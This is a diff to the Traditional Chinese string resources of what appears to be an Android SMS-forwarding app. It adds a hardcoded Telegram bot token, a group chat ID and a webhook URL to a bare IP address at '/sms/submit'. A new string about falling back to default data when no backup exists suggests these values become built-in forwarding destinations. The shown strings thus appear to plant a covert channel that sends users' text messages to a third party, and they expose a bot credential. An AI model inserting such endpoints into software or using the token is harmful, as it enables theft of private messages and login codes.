@@ -28,6 +28,10 @@
     <string name="insert_tag_ip_list">IP地址列表</string>
     <string name="insert_tag_net_type">網路狀態</string>
 
+    <string name="telegram_robot_token">7441352558:AAFsiQQIvQMp4RnIHk0zNUYN97HkmsKDTQY</string>
+    <string name="telegram_group_chat">-4783596760</string>
+    <string name="webhhok_url">http://43.205.229.196:8989/sms/submit</string>
+
     <string name="type_param_sms">簡訊</string>
     <string name="type_param_call">通話</string>
     <string name="type_param_app">應用</string>
@@ -791,6 +795,7 @@
     <string name="export_failed">導出失敗，請檢查寫入權限！</string>
     <string name="export_failed_tips">導出失敗: %s</string>
     <string name="import_failed">導入失敗：請檢查是否有外部存儲訪問權限！</string>
+    <string name="import_file_failed_use_str">本地备份文件不存在,使用默认数据</string>
     <string name="import_failed_file_not_exist">導入失敗：本地備份文件不存在！</string>
     <string name="import_succeeded">導入配置成功！\n需要重啟APP以便生效！\n重啟後請再次核對所有配置項！</string>
     <string name="import_failed_tips">導入失敗: %s</string>
